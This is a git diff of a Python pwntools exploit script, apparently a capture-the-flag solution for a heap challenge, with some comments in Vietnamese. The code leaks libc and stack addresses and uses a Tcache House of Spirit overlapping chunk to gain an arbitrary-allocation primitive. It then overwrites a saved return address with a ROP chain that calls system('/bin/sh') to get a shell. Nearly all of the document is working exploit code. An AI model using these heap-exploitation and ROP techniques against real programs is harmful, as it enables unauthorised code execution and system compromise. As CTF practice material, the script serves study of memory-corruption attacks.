@@ -70,7 +70,6 @@ def SET_SUPER_TAUNT(idx:int, plague: bytes):
     sla(menu_choice, b"5")
     sla(b"Index for Super Taunt: ", str(idx).encode())
     sa(b"Plague to accompany the super taunt: ", plague)
-    
 # --- end functions ---
 
 # Specify your GDB script here for debugging
@@ -92,59 +91,63 @@ io = start()
 # setup name length to leak stack address
 sa(menu_choice, b"s"*0x10)
 
-CREATE(b"test", b"a"*0x20) # 0
+# 1. leak libc
+CREATE(b"test", b"a"*0x20)                                      # 0
 SET_SUPER_TAUNT(0, b"l"*136)
+
 io.recvuntil(b"l"*136)
 leaked_puts = u64(io.recv(6).ljust(8, b"\x00"))
 libc.address = leaked_puts - libc.sym['puts']
-success(f"libc.address: {hex(libc.address)}")
+success(f"done 1. libc.address: {hex(libc.address)}")
+# --- done 1. leak libc ---
 
-CREATE(b"garbage", b"garbage") # 1: addr sang dau 3
+# 2. setup overlapped chunk by Tcache House of Spirit
+CREATE(b"garbage", b"garbage")                                  # 1: địa chỉ taunt sang đầu 0x*****3**
 
-fake_tcache = b""
-fake_tcache += p64(0)
-fake_tcache += p64(0x31)
-fake_tcache += b"ffffffff"
-fake_tcache += b"kkkkkkkk"
-fake_tcache += p64(0) # fake ptr_another = null
-CREATE(b"garbage", fake_tcache) # 2: target contains fake tcache
+fake_tcache = flat(
+    0, 0x31,                # prev_size | size
+    b"n"*8, b"k"*8,         # next | key
+    0,                      # fake taunt->ptr_another = null => free (fake taunt=>ptr_another) don't crash    
+)
 
-overwrite_1_byte = b"a"*12 + b"\x90"
-CHANGE_USER(overwrite_1_byte)
-io.recvuntil(b"s"*0x10)
-leaked_stack = u64(io.recv(6).ljust(8, b"\x00"))
-success(f"leaked stack: {hex(leaked_stack)}")
+CREATE(b"garbage", fake_tcache)                                 # 2: target contains fake tcache
 
-CREATE(b"garbage", b"a"*0x20) # 3: increase tcache count
-REMOVE(3), # increase tcache count
+overwrite_1_byte = b"a"*12 + b"\x90"                            # địa chỉ fake chunk có dạng 0x*****390
+CHANGE_USER(overwrite_1_byte)                                   # vừa ghi đè ptr, vừa leak stack
+io.recvuntil(b"s"*0x10)                                         
+leaked_stack = u64(io.recv(6).ljust(8, b"\x00"))                
+success(f"done 2.1 leaked stack: {hex(leaked_stack)}")
 
-REMOVE(1)
-REMOVE(2)
+CREATE(b"garbage", b"a"*0x20)                                   # 3: increase tcache count
+REMOVE(3),                                                      # increase tcache count
 
+REMOVE(1)                                                       # free overwrited taunts[1] (now is fake tcache chunk)
+REMOVE(2)                                                       # free taunts[2] overlapped with fake tcache chunk
+# --- done 2. Tcache House of Spirit ---
 
+# 3. calculate the stack address contains return address of function create_taunt
 debug_saved_rip = 0x7fffffffdef8
 debug_leaked_stack = 0x7fffffffdf10
 real_saved_rip = leaked_stack - (debug_leaked_stack - debug_saved_rip)
-info(f"real saved_rip: {hex(real_saved_rip)}")
+info(f"done 3. real saved_rip: {hex(real_saved_rip)}")
+# --- done 3. ---
 
+# final. exploit overlapped chunk to overwrite tcache->next => Malloc-Where primitive
 where_you_want_to_write = p64(real_saved_rip)
 
-payload = b"a"*0x10 + where_you_want_to_write
-payload = payload + (0x30-(len(payload)))*b"a"
+payload = (b"a"*0x10 + where_you_want_to_write).ljust(0x30, b'a')   # fake_tcache->next = where_you_want_to_write
 CREATE(b"garbage", payload)
 
-poprdi = libc.address + 0x0000000000023b6a #: pop rdi ; ret
-ret = libc.address + 0x0000000000022679 #: ret
+roplibc = ROP(libc)
+poprdi = roplibc.find_gadget(['pop rdi', 'ret'])[0]
+ret = roplibc.find_gadget(['ret'])[0]
 
 payload = flat(
-    p64(poprdi),
-    p64(next(libc.search(b"/bin/sh\x00"))),
-    p64(ret),
-    p64(libc.sym['system']),    
-)
-
-need_len = 0x20
-payload = payload + (0x20-len(payload))*b"a"
+    poprdi,
+    next(libc.search(b"/bin/sh\x00")),
+    ret,
+    libc.sym['system'],    
+).ljust(0x20, b'a')
 
 CREATE(b"garbage", payload)
 
